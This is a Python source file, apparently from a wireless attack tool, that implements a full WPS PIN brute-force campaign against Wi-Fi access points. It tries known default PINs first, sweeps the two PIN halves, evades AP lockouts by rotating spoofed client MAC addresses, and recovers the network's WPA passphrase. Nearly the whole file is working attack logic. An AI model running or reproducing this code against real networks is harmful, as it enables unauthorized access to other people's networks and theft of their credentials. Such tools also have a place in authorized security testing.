"""WpsCampaign — the Focus-facing WPS PIN brute-force orchestrator.

Drives the two-halves (4+3+checksum) PIN sweep.
Tries to keep-alive association, re-associates on loss.

Owns:
- COMMON → first-half → second-half PIN iterator,
- lock detection + adaptive backoff,
- `.run` resume state from filesystem,
- progress/ETA, and
- pause()/resume() to prevent simultaneous TX attacks.

Sweep / oracle wiring (see registrar.py):
  COMMON_PINS, then first-half sweep until the AP returns M5
  (``first_half_ok``) → lock that P1 → second-half sweep until SUCCESS.
"""

from __future__ import annotations

import asyncio
import json
import logging
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Optional

from ..campaign import Campaign
from . import known_pins
from . import pins as pinmod
from .association import WlanTransport, WpsAssociation, random_client_mac, str_to_mac
from .lock import LockTracker
from .registrar import AttemptOutcome, PinResult, WpsRegistrar, config_error_name

logger = logging.getLogger(__name__)


@dataclass
class CampaignState:
    bssid: str
    ssid: str = ""
    phase: str = "common"   # common | first_half | second_half | done | verify | failed
    common_index: int = 0
    p1_index: int = 0
    p2_index: int = 0
    first_half: Optional[str] = None
    skip_middle: Optional[str] = None  # The middle-3 of the (4+3+checksum) PIN.
    # First-halves the AP already ruled out (M4 first_half_wrong). Once "1234" is wrong,
    # every 1234-XXXX candidate is wrong too — skip them (COMMON dups like
    # 12345670/12345678, and the sweep later re-hitting a COMMON prefix). Persisted, so
    # resume reconstructs the exact same candidate stream.
    dead_first_halves: list[str] = field(default_factory=list)
    found_pin: Optional[str] = None
    found_psk: Optional[str] = None
    attempts: int = 0     # sessions started (incl. rate-limited no-ops)
    tested: int = 0       # attempts that actually reached the M4 oracle
    updated: float = 0.0


def _state_path(state_dir, bssid: str) -> Path:
    return Path(state_dir) / f"wps_{bssid.lower().replace(':', '-')}.run"


def load_run_state(state_dir, bssid: str) -> Optional[CampaignState]:
    """Read the on-disk .run resume state for a BSSID (no side effects), or None if
    there's no sweep on file / it's unreadable. Lets Focus surface prior WPS-PIN
    progress at target-acquisition without spinning up a campaign."""
    path = _state_path(state_dir, bssid)
    if not path.exists():
        return None
    try:
        data = json.loads(path.read_text())
        return CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
    except Exception:
        return None


def run_progress_line(state: CampaignState) -> Optional[str]:
    """One-line WPS-PIN sweep progress (rich markup) for the Focus history, or None
    when there's nothing to add: a cracked sweep already shows as a saved WPS PSK
    row, and an unstarted one has no news. Denominators mirror
    focus_model.wps_status_markup — 11k during the first half, 1k once it's locked."""
    if state.found_pin:
        return None                        # the _wps_pin.txt row already reports the win
    if state.phase == "failed":
        return (f"[bold]WPS PIN[/bold] sweep [red]exhausted[/red] "
                f"[dim]({state.tested:,} tried · not found)[/dim]")
    if state.phase == "second_half" and state.first_half:
        # First half locked — the live keyspace is the 1,000-candidate second half.
        return (f"[bold]WPS PIN[/bold] sweep: [cyan]{state.p2_index}[/cyan]/1,000 "
                f"[dim]· first half [green]{state.first_half}[/green] locked[/dim]")
    return (f"[bold]WPS PIN[/bold] sweep: [cyan]{state.tested:,}[/cyan]/11,000 "
            f"[dim]· resumes where it left off[/dim]")


class WpsCampaign(Campaign):
    _SAVE_EVERY = 16   # checkpoint the .run file every N attempts
    _MAX_TIMEOUT_RETRIES = 8   # retries of a silent (lost-reply) attempt before conceding
    _REFUSAL_BAIL = 3   # consecutive active refusals (disassoc / identity-stall) before giving up

    button_id = "btn-wps-pin"
    key = "wps"
    hotkey = ("i", "WPS PIN")
    idle_label = "WPS PIN"
    run_label = "Stop PIN"
    idle_variant = "primary"
    run_variant = "error"

    @classmethod
    def visible(cls, ap) -> bool:
        return ((getattr(ap, "encryption", None) or "").upper() != "WEP"
                and bool(getattr(ap, "wps", False)))

    @classmethod
    def ineligible_reason(cls, ap):
        return "WPS locked" if getattr(ap, "wps_locked", False) else None

    def __init__(self, iface, target, state_dir="captures", log=None,
                 inter_attempt_delay: float = 0.0):
        super().__init__(ap=target, iface=iface)
        self.target = target
        self.bssid = target.bssid.lower()
        self.channel = target.channel
        self.state_dir = state_dir
        self.log = log or logger.info
        self.inter_attempt_delay = inter_attempt_delay

        self.our_mac = random_client_mac()
        self.assoc: Optional[WpsAssociation] = None
        self.transport: Optional[WlanTransport] = None
        self._ack = False   # PIN sweep runs auto-ACK OFF (see _ensure_session); every TX goes no-ACK
        self.lock = LockTracker()

        self.state = self._load_state()
        # self.stopped / self._task come from Campaign; only WPS-specific flags here.
        self._paused = False
        self.status = "idle"      # idle | running | paused | locked | found | failed | error

        self._attempt_ewma = 0.5  # seconds/attempt, for ETA

        # Suppress consecutive duplicate per-attempt log lines (same pin + same result)
        # AP repeats responses if we don't respond fast enough (which we don't)
        self._last_attempt_sig: Optional[tuple] = None

        # Live lock state for the SECURITY status row's countdown / kind display.
        # "hard" = beacon AP-Setup-Locked (the AP itself says it's not doing WPS);
        # "soft" = our internal backoff after N consecutive pre-oracle rejects.
        self._lock_kind: Optional[str] = None
        self._lock_end_at: Optional[float] = None
        self._consecutive_locks_no_progress = 0

        # COMMON-phase candidates: OUI-known factory PINs first (highest hit-rate for this
        # hardware family), then the generic COMMON list. Deduped, order preserved.
        oui_pins = known_pins.known_pins_for(self.bssid)
        self._oui_pin_count = len(oui_pins)
        self._common_pins = list(dict.fromkeys(oui_pins + list(pinmod.COMMON_PINS)))

        # A silent timeout after M4/M6 is only *assumed* wrong (timeout-as-NACK). Once an
        # AP has proven it sends explicit NACKs, a silent drop is instead a LOST reply — on a
        # weak link we can miss every one of the AP's M-frame retransmits — so we retry the
        # same PIN rather than advance past a possibly-correct half. Bounded
        # (_MAX_TIMEOUT_RETRIES) so a persistently-dropping RX still advances instead of wedging.
        self._ap_sends_nacks = False
        self._timeout_retries = 0
        # An AP that *actively* refuses external-registrar WPS — disassociates us, or engages EAP but
        # stalls at Identity and never sends M1 — isn't crackable (WPS ext-reg disabled, or it's
        # 802.1X). Count consecutive refusals and bail rather than soft-lock-churn forever. (Mere
        # silence is NOT a refusal — that stays infinite-patience, could be a distant AP.)
        self._consecutive_refusals = 0
        self.fail_reason: Optional[str] = None   # terse give-up reason; Focus renders the fail-leaf
        self._last_logged_pin: Optional[str] = None   # log the PIN only when it changes (save width)

    # ---- persistence --------------------------------------------------------
    def _load_state(self) -> CampaignState:
        path = _state_path(self.state_dir, self.bssid)
        if path.exists():
            try:
                data = json.loads(path.read_text())
                data.setdefault("bssid", self.bssid)
                st = CampaignState(**{k: data[k] for k in data if k in CampaignState.__annotations__})
                if st.found_pin:
                    # Previous run recovered the PIN. The user clicking WPS PIN
                    # again means "re-verify against the live AP" — handled by
                    # _run switching to the "verify" phase.
                    self.log(f"resumed campaign: previously recovered PIN "
                             f"[black bold on cyan] {st.found_pin} [/black bold on cyan]")
                elif st.first_half:
                    # In-progress with first-half locked in — surface it.
                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
                             f"/11,000 pins, [cyan bold]{st.first_half}[/cyan bold]"
                             f"[white bold]????[/white bold]")
                else:
                    self.log(f"resumed campaign: [cyan]{st.tested:,}[/cyan]"
                             f"/11,000 pins")
                return st
            except Exception as e:
                logger.warning("WPS state load failed (%s); starting fresh", e)
        return CampaignState(bssid=self.bssid, ssid=self.target.ssid or "")

    def _save_state(self) -> None:
        self.state.updated = time.time()
        path = _state_path(self.state_dir, self.bssid)
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(json.dumps(asdict(self.state), indent=2))
        except Exception as e:
            logger.warning("WPS state save failed: %s", e)

    # ---- lifecycle (run()/stop() come from Campaign) ------------------------
    async def teardown(self) -> None:
        """Exit-driven cleanup (every exit: done / stop / crash) — checkpoint the
        resume state, drop the kept-alive association + transport, release the
        active-monitor MAC."""
        self._save_state()
        self._teardown()
        await self.iface.clear_fake_mac()

    def pause(self) -> None:
        self._paused = True
        if self.status == "running":
            self.status = "paused"

    def resume(self) -> None:
        self._paused = False

    def _teardown(self) -> None:
        if self.transport:
            self.transport.stop()
        if self.assoc:
            self.assoc.stop()
        self.transport = self.assoc = None

    @property
    def eta_seconds(self) -> Optional[float]:
        """Rough worst-case remaining time at the current rate."""
        if self.state.phase == "first_half":
            remaining = 10000 - self.state.p1_index + 1000
        elif self.state.phase == "second_half":
            remaining = 1000 - self.state.p2_index
        elif self.state.phase == "common":
            remaining = len(self._common_pins) - self.state.common_index + 10000 + 1000
        else:
            return 0.0
        return remaining * self._attempt_ewma

    # ---- the sweep ----------------------------------------------------------
    async def _ensure_session(self) -> bool:
        if self.assoc is None:
            # Auto-ACK OFF (no active-monitor). Hardware ground-truth (AirLink): arming it HURTS —
            # HW-ACKing the AP's M-frames kills the AP's own retransmit safety net, so any dropped
            # frame is permanent (false first-half-wrong / missed M7). Un-ACKed lets the AP
            # retransmit; our resends (association + registrar in-session) cover a dropped TX. Also
            # frees WPS from needing active-monitor support on the card.
            await self.iface.clear_fake_mac()
            self._ack = False
            self.assoc = WpsAssociation(self.iface, self.bssid, self.target.ssid or "",
                                        self.channel, our_mac=self.our_mac)
            self.assoc.start()
            self.transport = WlanTransport(self.iface, str_to_mac(self.bssid), self.our_mac,
                                           ack=self._ack)
            self.transport.start()
        if not self.assoc.associated:
            return await self.assoc.associate()
        return True

    async def _try(self, pin: str) -> AttemptOutcome:
        """One PIN attempt on a FRESH association. Hardware ground-truth (AirLink): the AP treats a
        WSC exchange as one-shot per association — a 2nd exchange on a kept-alive assoc is refused
        pre-oracle with 'Device Password Auth Failure' — so we re-associate per PIN, as reaver does."""
        if not await self._ensure_session():
            return AttemptOutcome(PinResult.PROTO_ERROR, pin, detail="assoc failed")
        self.transport.drain()
        reg = WpsRegistrar(self.transport, str_to_mac(self.bssid), self.our_mac,
                           should_stop=lambda: self.stopped)
        try:
            return await reg.try_pin(pin)
        finally:
            self._reset_session()   # fresh WSC session for the next PIN

    def _next_pin(self) -> Optional[str]:
        """The next candidate per the current phase, or None when exhausted."""
        st = self.state
        if st.phase == "verify":
            return st.found_pin  # Verify the already-found PIN
        if st.phase == "common":
            while st.common_index < len(self._common_pins):
                candidate = self._common_pins[st.common_index]
                if candidate[:4] in st.dead_first_halves:   # first half already ruled out
                    st.common_index += 1
                    continue
                return candidate
            st.phase = "first_half"
        if st.phase == "first_half":
            while st.p1_index < 10000:
                first4 = f"{st.p1_index:04d}"
                if first4 in st.dead_first_halves:           # e.g. a COMMON prefix already tried
                    st.p1_index += 1
                    continue
                return pinmod.full_pin(first4, "000")
            st.phase = "failed"  # Never encountered "Second half wrong"
            return None
        if st.phase == "second_half" and st.first_half is not None:
            # Find the 2nd half to attempt
            while st.p2_index < 1000:
                middle = f"{st.p2_index:03d}"
                # Skip singular second-half already attempted in first_half
                if middle == st.skip_middle:
                    st.p2_index += 1
                    continue
                return pinmod.full_pin(st.first_half, middle)
            st.phase = "failed"
            return None
        return None

    def _apply_outcome(self, pin: str, out: AttemptOutcome) -> None:
        """Advance the keyspace from one successful attempt."""
        st = self.state
        # WPS_CFG_SETUP_LOCKED (config_error 15): the AP explicitly says WPS is locked — a lock,
        # never a wrong PIN, whatever the stage. Don't advance the keyspace. (AirLink locks
        # *silently* via assoc-fail instead; this is the spec path for APs that signal it.)
        if out.config_error == 15:
            self.lock.note_setup_locked()
            return
        if out.result in (PinResult.PROTO_ERROR, PinResult.TIMEOUT):
            self.lock.note_pre_oracle_reject()
            return

        st.tested += 1
        self.lock.note_progress()
        # A real M4 oracle result means the AP IS letting our (rotated) client
        # through. reset the lock ramp so the NEXT soft-lock also skips its wait.
        self._consecutive_locks_no_progress = 0

        # Verify phase has its own dispatch — it doesn't advance the keyspace.
        if st.phase == "verify":
            self._apply_verify_outcome(pin, out)
            return

        if out.result is PinResult.SUCCESS:
            st.found_pin, st.found_psk, st.phase = pin, out.psk, "done"
        elif out.first_half_ok:
            # AP reached M5 → this first half is correct. (SECOND_HALF_WRONG)
            if st.phase != "second_half":
                st.first_half = pinmod.split_pin(pin)[0]
                st.phase, st.p2_index = "second_half", 0
                st.skip_middle = pin[4:7]  # Avoid trying the same PIN twice
            else:
                st.p2_index += 1
        elif out.result is PinResult.FIRST_HALF_WRONG:
            # This first half is dead — record it so we skip any other candidate that
            # shares it. Only the COMMON phase needs to add (the sweep is monotonic and
            # never revisits a prefix), which keeps the persisted set to a handful.
            if st.phase == "common":
                first4 = pin[:4]
                if first4 not in st.dead_first_halves:
                    st.dead_first_halves.append(first4)
                st.common_index += 1
            elif st.phase == "first_half":
                st.p1_index += 1

    def _apply_verify_outcome(self, pin: str, out: AttemptOutcome) -> None:
        """Resume-time re-verification of a previously-recovered PIN."""
        st = self.state
        if out.result is PinResult.SUCCESS:
            # PIN verified as working
            new_psk = out.psk or ""
            old_psk = st.found_psk or ""
            if new_psk != old_psk:
                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan] "
                         f"— [bold yellow]PSK CHANGED[/bold yellow] "
                         f"[dim](updated below)[/dim]")
            else:
                self.log(f"[bold green]verified[/bold green] PIN [cyan]{pin}[/cyan] "
                         f"[dim](PSK unchanged)[/dim]")
            st.found_psk = new_psk
            st.phase = "done"
            return
        if out.first_half_ok:
            # PIN changed: SECOND_HALF_WRONG — first half still valid
            kept = pinmod.split_pin(pin)[0]
            self.log(f"[yellow]PIN's second half changed[/yellow] — "
                     f"first half [green]{kept}[/green] still valid; "
                     f"sweeping second half again")
            st.first_half = kept
            st.found_pin = None
            st.found_psk = None
            st.phase = "second_half"
            st.p2_index = 0
            st.skip_middle = pin[4:7]   # confirmed-wrong middle
            return
        if out.result is PinResult.FIRST_HALF_WRONG:
            # PIN changed: Nothing from old PIN is recoverable.
            self.log("[red]PIN no longer valid[/red] "
                     "[dim](first half wrong — restarting full sweep)[/dim]")
            st.first_half = None
            st.found_pin = None
            st.found_psk = None
            st.phase = "common"
            st.common_index = 0
            st.p1_index = 0
            st.p2_index = 0
            st.skip_middle = None

    async def _loop(self) -> None:
        self.status = "running"
        name = self.target.ssid or self.bssid
        logger.debug("WPS campaign start on %s (mac %s)", name, self.our_mac.hex())
        if self._oui_pin_count:
            self.log(f"OUI match: [cyan]{self._oui_pin_count}[/cyan] known default "
                     f"PIN(s) — [dim]seeded ahead of the brute sweep[/dim]")

        # When resuming with a previously-recovered PIN, re-verify it against the AP
        if self.state.phase == "done" and self.state.found_pin:
            self.log("re-verifying PIN against the AP "
                     "[dim](if the PSK changed, we'll catch it)[/dim]")
            self.state.phase = "verify"

        try:
            while not self.stopped:
                if self._paused:
                    self.status = "paused"
                    await asyncio.sleep(0.2)
                    continue

                beacon_locked = self._beacon_locked()
                if self.lock.is_locked(beacon_locked):
                    # Skip the wait the first soft-lock after every tested++:
                    # most "soft locks" are just per-MAC rate-limiting, which a
                    # rotation alone fixes in zero time.
                    skip_wait = (not beacon_locked
                                 and self._consecutive_locks_no_progress == 0)
                    await self._handle_lock(beacon_locked, wait=not skip_wait)
                    if self.stopped:
                        break  # Short circuit before next phase
                    self._rotate_mac()
                    self._consecutive_locks_no_progress += 1
                    continue

                pin = self._next_pin()
                if pin is None:
                    self.status = "found" if self.state.found_pin else "failed"
                    break

                self.status = "running"
                # Detect transitions
                prev_first_half = self.state.first_half
                prev_phase = self.state.phase
                t0 = time.monotonic()
                out = await self._try(pin)
                # EWMA: Exponentially Weighted Moving Average. tl;dr math
                self._attempt_ewma = 0.7 * self._attempt_ewma + 0.3 * (time.monotonic() - t0)
                self.state.attempts += 1

                if self.stopped:
                    break   # Stopped mid-attempt (user Stop / AP switch): bail BEFORE logging or
                    #         advancing — else the interrupted result leaks into the next session's log.

                if out.refused:   # AP actively rejected external-registrar WPS — never advances
                    self._consecutive_refusals += 1
                    # Log each one (no dedup) so the disassoc-vs-identity-stall variation shows.
                    self.log(f"{self._attempt_prefix(pin)} → [yellow]{out.detail}[/yellow] "
                             f"[dim bold]\\[#{self._consecutive_refusals}][/dim bold]")
                    if self._consecutive_refusals >= self._REFUSAL_BAIL:
                        self.status = "failed"        # Focus renders the fail-leaf from fail_reason
                        self.fail_reason = f"AP refused before M1 {self._REFUSAL_BAIL}×"
                        self._save_state()
                        break
                    continue                       # bounded retry; never advance the keyspace
                self._consecutive_refusals = 0

                if self._should_retry_lost_reply(pin, out):
                    # Session already reset by _try; the retry re-associates fresh (same MAC).
                    if self.state.attempts % self._SAVE_EVERY == 0:
                        self._save_state()
                    continue                       # retry the SAME pin — do not advance

                self._apply_outcome(pin, out)

                verify_terminal = (prev_phase == "verify" and out.result not in
                                   (PinResult.PROTO_ERROR, PinResult.TIMEOUT))
                # Avoid logging an "attempt" on a verified PIN, or after user halt.
                if not verify_terminal and not self.stopped:
                    self._log_attempt(pin, out, prev_first_half)

                if self.state.phase == "done":
                    self._save_state()
                    self.status = "found"
                    break

                if self.state.attempts % self._SAVE_EVERY == 0:
                    self._save_state()
                if self.inter_attempt_delay:
                    await asyncio.sleep(self.inter_attempt_delay)
        except Exception as e:
            logger.exception("WPS campaign crashed")
            self.status = "error"
            self.log(f"[red]campaign error:[/red] {e}")
        # save + _teardown + clear_fake_mac now run in teardown() (every exit).

    def _beacon_locked(self) -> bool:
        ap = self.iface.access_points.get(self.bssid) if hasattr(self.iface, "access_points") else None
        return bool(getattr(ap, "wps_locked", False)) if ap else False

    async def _handle_lock(self, beacon_locked: bool, wait: bool = True) -> None:
        """Mark the lock state, optionally wait it out, then release.

        ``wait=False`` is the adaptive fast path for the first soft-lock since
        last progress: we just log + rotate, skipping the (often-unnecessary)
        backoff entirely. Hard locks (beacon WPS-Locked) ALWAYS wait — the AP
        is saying it won't do WPS at all, no point retrying immediately.
        """
        self.lock.begin_lock()
        # "hard" = AP itself advertises WPS locked in its beacons (matches the 🔒
        # in the SECURITY row). "soft" = our backoff after N pre-oracle rejects;
        # AP isn't beaconing locked, it's just refusing rapid retries.
        self._lock_kind = "hard" if beacon_locked else "soft"
        trigger = "beacon" if beacon_locked else f"{self.lock.strikes} strikes"
        if wait:
            # Slow path: AP is locked
            backoff = self.lock.backoff()
            self._lock_end_at = time.monotonic() + backoff
            self.status = "locked"
            self.log(f"[red]AP locked[/red] [dim]({self._lock_kind}, {trigger}) "
                     f"backing off {backoff:.0f}s[/dim]")
            self._save_state()
            end = time.monotonic() + backoff
            while time.monotonic() < end and not self.stopped:
                await asyncio.sleep(0.5)
                if not self._beacon_locked() and self.lock.strikes < self.lock.strike_threshold:
                    break
        else:
            # Fast path: Assume AP is not locked to a new MAC
            self.log(f"[yellow]soft-lock[/yellow] [dim]({trigger}) — "
                     f"rotating MAC, no wait[/dim]")
        self.lock.end_lock()
        self._lock_kind = None
        self._lock_end_at = None
        self._last_attempt_sig = None  # The next attempt is a new conversation, don't dedupe.

    @property
    def lock_kind(self) -> Optional[str]:
        """'hard' / 'soft' / None — see _handle_lock."""
        return self._lock_kind

    @property
    def lock_remaining_seconds(self) -> float:
        """Seconds remaining on the current backoff (0 if not locked)."""
        if self._lock_end_at is None:
            return 0.0
        return max(0.0, self._lock_end_at - time.monotonic())

    def _should_retry_lost_reply(self, pin: str, out: AttemptOutcome) -> bool:
        """True if this half-wrong was inferred from *silence* on an AP we know sends
        explicit NACKs — i.e. a lost reply, not a real rejection. Retry the same PIN
        (caller rotates the MAC) instead of advancing. Bounded by _MAX_TIMEOUT_RETRIES so
        a persistently-dropping RX eventually concedes rather than wedging on one PIN."""
        if out.config_error is not None:
            self._ap_sends_nacks = True   # this AP answers wrong guesses with a real NACK
        silent_half_wrong = (
            out.via_timeout and self._ap_sends_nacks
            and out.result in (PinResult.FIRST_HALF_WRONG, PinResult.SECOND_HALF_WRONG))
        if not silent_half_wrong:
            self._timeout_retries = 0
            return False
        self._timeout_retries += 1
        if self._timeout_retries > self._MAX_TIMEOUT_RETRIES:
            self.log(f"trying [cyan]{pin}[/cyan] → [yellow]no reply after "
                     f"{self._timeout_retries} tries[/yellow] — conceding as wrong")
            self._timeout_retries = 0
            return False                  # give up retrying; fall through to advance
        lost = "M5" if out.result is PinResult.FIRST_HALF_WRONG else "M7"
        self.log(f"trying [cyan]{pin}[/cyan] → [dim]no reply (likely a lost {lost}) — "
                 f"retrying (#{self._timeout_retries})[/dim]")
        self.lock.note_progress()         # a lost reply isn't a lock; keep the strike clean
        return True

    def _reset_session(self) -> None:
        """Drop the association + transport so the next attempt re-associates (keeps the MAC)."""
        if self.transport is not None:
            self.transport.stop()
        if self.assoc is not None:
            self.assoc.stop()
        self.assoc = None
        self.transport = None
        self._last_attempt_sig = None

    def _rotate_mac(self) -> None:
        """Fresh random MAC (+ fresh session). Rate-limit fallback only — the AP is NOT
        one-shot-per-MAC (proven on hardware), so this is not part of the normal loop."""
        self._reset_session()
        old = self.our_mac
        self.our_mac = random_client_mac()
        logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())

    def _attempt_prefix(self, pin: str) -> str:
        """Colour the PIN when it changed since the last logged line, else a short continuation
        marker aligned under it — most of a WPS log line's width is the 8-digit PIN + 'trying'."""
        if pin == self._last_logged_pin:
            return "[dim]     ↳[/dim]"
        self._last_logged_pin = pin
        return f"[cyan]{pin}[/cyan]"

    def _log_attempt(self, pin: str, out: AttemptOutcome,
                     prev_first_half: Optional[str]) -> None:
        """One concise line per PIN attempt — what was tested, what came back,
        and how deep the exchange got ([Mx] marker). SUCCESS is intentionally
        silent here; the UI closes the campaign tree with bold cyan PIN + green
        PSK leaves via _stop_wps_pin.
        """
        if out.result is PinResult.SUCCESS:
            return
        # First-half just confirmed gets a forced log even if sig duplicates —
        # it's a real state change, the next attempt will have a new pin anyway.
        first_half_just_confirmed = (
            self.state.first_half is not None and prev_first_half is None)

        sig = (pin, out.result)
        if sig == self._last_attempt_sig and not first_half_just_confirmed:
            return  # Avoid duplicate attempt logs
        self._last_attempt_sig = sig

        label = self._attempt_prefix(pin)
        if first_half_just_confirmed:
            self.log(f"{label} → [green]first half OK[/green] "
                     f"[dim bold]\\[M5][/dim bold]")
            return
        if out.result is PinResult.FIRST_HALF_WRONG:
            self.log(f"{label} → [red]first half wrong[/red] [dim bold]\\[M4][/dim bold]")
        elif out.result is PinResult.SECOND_HALF_WRONG:
            self.log(f"{label} → [dark_orange]second half wrong[/dark_orange] "
                     f"[dim bold]\\[M6][/dim bold]")
        elif out.result is PinResult.PROTO_ERROR:
            if out.detail == "assoc failed":   # not a NACK — we never associated (AP often locked)
                self.log(f"{label} → [yellow]no assoc[/yellow]")
            else:
                # De-swallowed reason: the AP answered with a NACK carrying a config-error.
                why = (config_error_name(out.config_error)
                       if out.config_error is not None else (out.detail or "?"))
                self.log(f"{label} → [yellow]refused: {why}[/yellow]")
        elif out.result is PinResult.TIMEOUT:
            # Only non-refused timeouts reach here (refused ones log in the loop). Terse.
            self.log(f"{label} → [dim]{out.detail or 'no reply'}[/dim]")
